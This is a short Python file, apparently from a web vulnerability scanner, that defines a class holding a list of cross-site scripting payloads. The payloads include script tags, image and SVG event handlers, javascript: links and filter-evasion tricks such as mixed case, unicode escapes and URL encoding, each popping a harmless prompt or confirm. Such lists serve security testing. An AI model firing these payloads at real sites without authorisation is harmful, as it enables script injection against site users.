#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author : Sedate

class XSSPayload(object):
    '''
    # xss payload
    '''
    xss_payload = (
        '"><ScRiPt>prompt(65535)</ScRiPt>',
        '"><ScRiPt>\u0065\u0076\u0061\u006c("\x70\x72\x6f\x6d\x70\x74\x28\x36\x35\x35\x33\x35\x29")</ScRiPt>',
        '"><img src=x onerror=prompt(1)>',
        '"><img src=x onerror=co\u006efir\u006d`1`>',
        '"><img/src=x%0Aonerror=prompt`1`>',
        '"><svg/onload=prompt(1)>',
        '"><svg/onload=co\u006efir\u006d`1`>',
        '"><iframe/src=javascript:prompt(1)>',
        '"><iframe/src=javascript:co\u006efir\u006d%28 1%29>',
        '"><a href=javascript:prompt(1)>Clickme</a>',
        '"><a href=javascript:prompt%281%29>Clickme</a>'
        '"><h1 onclick=prompt(1)>Clickme</h1>',
        '"><h1 onclick=co\u006efir\u006d(1)>Clickme</h1>',
        '"><textarea autofocus onfocus=prompt(1)>',
        '"><textarea autofocus onfocus=co\u006efir\u006d(1)>',
        '"><a/href=javascript&colon;co\u006efir\u006d&#40;&quot;1&quot;&#41;>clickme</a>',
        '"><ScRiPt>co\u006efir\u006d`1`</ScRiPt>',
        '"><details/ontoggle=co\u006efir\u006d`1`>clickmeonchrome',
        '"><p/id=1%0Aonmousemove%0A=%0Aconfirm`1`>hoveme'
    )
